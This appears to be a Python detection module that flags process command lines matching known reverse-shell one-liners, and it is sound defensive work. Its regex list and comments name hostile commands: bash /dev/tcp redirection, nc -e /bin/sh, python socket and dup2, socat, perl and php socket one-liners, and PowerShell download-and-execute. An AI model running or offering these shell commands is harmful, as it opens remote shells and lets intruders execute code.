"""Flags a cmdline that matches one of the well-documented reverse-shell
one-liners (bash /dev/tcp, nc -e, python socket+dup2, perl/php/socat
variants, PowerShell hidden-window download-and-execute). These patterns
are widely published (pentestmonkey's cheat sheet and equivalents)
precisely because they're distinctive; a legitimate use of the same
one-liner is rare but not impossible (e.g. a pentester's own authorized
tooling).
"""
from __future__ import annotations

import re

_PATTERNS = [
    re.compile(r"/dev/tcp/[\w.\-]+/\d+"),                        # bash -i >&/dev/tcp/HOST/PORT 0>&1
    re.compile(r"\bnc\b.{0,20}-e\s*/bin/(ba)?sh"),                # nc -e /bin/sh
    re.compile(r"socket\.socket\(.{0,40}\bconnect\("),            # python raw socket + connect
    re.compile(r"os\.dup2\("),                                    # python dup2 shell redirection
    re.compile(r"socat\s+.*exec:.*sh"),                           # socat exec:sh variants
    re.compile(r"perl\s+-e\s*.{0,10}Socket"),                     # perl one-liner reverse shell
    re.compile(r"php\s+-r\s*.{0,10}fsockopen"),                   # php -r fsockopen(...)
    re.compile(r"-nop\s+-w\s+hidden\s+-c"),                       # PowerShell hidden-window one-liner
    re.compile(r"IEX\s*\(\s*New-Object\s+Net\.WebClient", re.I),  # PowerShell download-and-execute
]


def enrich(process_info):
    cmdline = process_info.get("cmdline") or ""
    if not cmdline:
        return {}
    hit = next((pat.pattern for pat in _PATTERNS if pat.search(cmdline)), None)
    if not hit:
        return {}
    return {
        "alert": "cmdline matches a known reverse-shell pattern",
        "matched_pattern": hit,
    }
